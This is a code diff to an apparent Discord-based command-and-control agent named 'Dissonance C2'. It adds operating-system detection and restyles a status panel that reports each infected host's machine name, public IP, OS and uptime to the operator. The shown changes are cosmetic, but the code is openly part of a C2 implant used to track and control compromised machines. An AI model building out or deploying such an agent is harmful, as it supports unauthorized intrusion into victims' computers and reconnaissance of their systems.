@@ -3,6 +3,7 @@ import discord
 import requests
 import socket
 import time
+import platform
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 GUILD_ID = int(os.getenv("GUILD_ID"))
@@ -25,7 +26,7 @@ def public_ip():
         return "Unknown"
 
 PUBLIC_IP = public_ip()
-
+OS = platform.system()
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -34,26 +35,46 @@ bot = discord.Client(intents=intents)
 
  # create the embed for the panel
 def embed():
+
     uptime = int(time.time() - start_time)
+
     days, uptime = divmod(uptime, 86400)
     hours, uptime = divmod(uptime, 3600)
     minutes, seconds = divmod(uptime, 60)
 
     e = discord.Embed(
-        title="DISSONANCE",
-        description="DISSONANCE C2 POC"
+        title="🟢 DISSONANCE",
+        description="C2 AGENT • ONLINE"
     )
 
-    for name, value in (
-        ("MACHINE NAME:", HOSTNAME),
-        ("PUBLIC IP:", PUBLIC_IP),
-        ("UPTIME:", f"{days}d {hours}h {minutes}m {seconds}s"),
-    ):
-        e.add_field(
-            name=name,
-            value=value,
-            inline=False
-        )
+    e.add_field(
+        name="🖥️ Machine",
+        value=f"`{HOSTNAME}`",
+        inline=True
+    )
+
+    e.add_field(
+        name="💻 OS",
+        value=f"`{OS}`",
+        inline=True
+    )
+
+    e.add_field(
+        name="🌐 Public IP",
+        value=f"`{PUBLIC_IP}`",
+        inline=True
+    )
+
+    e.add_field(
+        name="⏱️ Uptime",
+        value=f"`{days}d {hours}h {minutes}m {seconds}s`",
+        inline=True
+    )
+
+    e.set_footer(
+        text="Dissonance C2 • Agent Status"
+    )
+
     return e
 
 
